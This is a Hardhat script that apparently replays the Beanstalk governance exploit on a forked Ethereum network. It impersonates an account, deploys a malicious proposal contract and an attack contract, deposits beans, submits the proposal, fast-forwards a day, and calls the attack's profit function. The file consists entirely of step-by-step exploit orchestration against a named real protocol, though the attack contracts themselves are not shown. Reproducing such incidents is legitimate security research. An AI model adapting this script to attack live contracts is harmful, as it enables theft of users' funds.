const hre = require("hardhat");



async function main() {

    const ATTACKER = "0x28C6c06298d514Db089934071355E5743bf21d60";
    const BEANPROTOCOL = "0xc1e088fc1323b20bcbee9bd1b9fc9546db5624c5";
    const BEAN = "0xDC59ac4FeFa32293A95889Dc396682858d52e5Db";
    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [ATTACKER],
    });
    const signer = await hre.ethers.getSigner(ATTACKER);
    
    let BIP18 = await hre.ethers.getContractFactory("BIP18",signer);
    const bip18 = await BIP18.deploy();
    await bip18.deployed();
    console.log("bip18 contract deployed to:", bip18.address);

    let ATTACK = await hre.ethers.getContractFactory("attack",signer);
    const attack = await ATTACK.deploy();
    await attack.deployed();
    console.log("attack contract deployed to:", attack.address);


    
    const BeanProtocol = await hre.ethers.getContractAt("contracts/attack.sol:IBeanProtocol", BEANPROTOCOL, signer);
    const Bean = await hre.ethers.getContractAt("contracts/attack.sol:IERC20", BEAN, signer);
    
    
    console.log("step 1: get some beans and make a proposal.");
    const depositAmount = await bip18.getSomeBeans({
        value: hre.ethers.utils.parseEther("73.0")
    });
    await Bean.approve(BEANPROTOCOL, 211000000000);
    await BeanProtocol.depositBeans(211000000000);
    await BeanProtocol.propose([], bip18.address, "0xe1c7392a", 3);
    console.log("step 2: wait for a day, to met the emergencyWithdraw time requirement.");
    await hre.network.provider.send("evm_increaseTime", [3600 * 24]);
    await hre.network.provider.send("evm_mine");
    console.log("step 3: launch the attack.");
    await attack.profit();



}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
